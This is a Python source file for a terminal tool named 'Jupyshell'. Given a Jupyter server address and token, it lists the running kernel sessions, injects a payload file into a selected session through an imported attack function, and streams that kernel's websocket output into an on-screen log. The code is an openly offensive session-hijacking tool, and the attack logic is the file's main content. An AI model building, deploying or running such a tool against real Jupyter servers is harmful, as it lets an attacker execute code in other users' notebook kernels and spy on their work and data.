import asyncio
from connection import Connection
from attack import attack_session
from pathlib import Path
import json
from websockets import connect
from urllib.parse import urlparse
from textual.app import App, ComposeResult
from textual.containers import ScrollableContainer, HorizontalScroll, VerticalScroll
from textual.widgets import Footer, Header, Select, RichLog
from rich.syntax import Syntax
from textual import events
from websox import recv_all

class MQRichLog(RichLog):
    def __init__(self, connection, session):
        super().__init__()
        self.connection = connection
        self.session = session

    def compose(self) -> ComposeResult:
        yield RichLog(highlight=True, markup=True)

    def on_ready(self) -> None:
        """Called  when the DOM is ready."""
        jpy_sess = self.connection.jpy_sessions[self.session]
        ws_base_url = urlparse(self.connection.url)._replace(scheme='ws').geturl()
        ws_url = ws_base_url + f'api/kernels/{jpy_sess["kernel"]["id"]}/channels?session_id={jpy_sess["id"]}'

        conn = connect(ws_url, extra_headers=self.connection.headers, close_timeout=5)
        results = recv_all(conn)

        text_log = self.query_one(RichLog)
        text_log.write(Syntax(results, "python", indent_guides=True))


    def on_key(self, event: events.Key) -> None:
        """Write Key events to log."""
        text_log = self.query_one(RichLog)
        text_log.write(event)
        
class Jupyshell(App):
    def __init__(self, host, secret):
        super().__init__()
        self.connection = Connection(host, secret)
        self.sessions = self.action_list_sessions()
        self.target_session = None
        self.MQ = MQRichLog(self.connection, self.target_session)
        

    BINDINGS = [
        ("s", "list_sessions", "List Sessions"),
        ("i", "inject_session", "Inject into session")
    ]


    def compose(self) -> ComposeResult:
        yield Header()
        yield Footer()
        yield ScrollableContainer(self.sessions, id="sessions")
        yield VerticalScroll(self.MQ, id="mq")

    def action_list_sessions(self) -> None:
        sessions = list_sessions(connection = self.connection)
        self.sessions = Select([(session, session) for session in sessions], allow_blank=False)
        return self.sessions

    async def action_inject_session(self) -> None:
        self.target_session = self.sessions.value
        self.MQ = MQRichLog(self.connection, self.target_session)
        self.query_one("#mq").mount(self.MQ)
        self.MQ.scroll_visible()
        await attack(connection = self.connection, session=self.target_session)
    
def list_sessions(connection):
    sessions = connection.list_running_jpy_sessions()
    return sessions


async def attack(connection, session: str = "", code: Path = Path("payload.py")):
    with open(code, "r") as f:
        code = f.read()
    result = await attack_session(connection, session, code)


if __name__ == "__main__":
    app = Jupyshell(host = "http://localhost:8888/", secret='abcdef')
    app.run()


'''

class MQ(RichLog):
    def __init__(self, connection, session):
        super().__init__()
        self.connection = connection
        self.session = session

    def compose(self) -> ComposeResult:
        if self.session is None:
            yield RichLog()
        else:
            jpy_sess = self.connection.jpy_sessions[self.session]
            ws_base_url = urlparse(self.connection.url)._replace(scheme='ws').geturl()
            ws_url = ws_base_url + f'api/kernels/{jpy_sess["kernel"]["id"]}/channels?session_id={jpy_sess["id"]}'

            conn = connect(ws_url, extra_headers=self.connection.headers, close_timeout=5)
            results = recv_all(conn)
            yield RichLog.write(results)
'''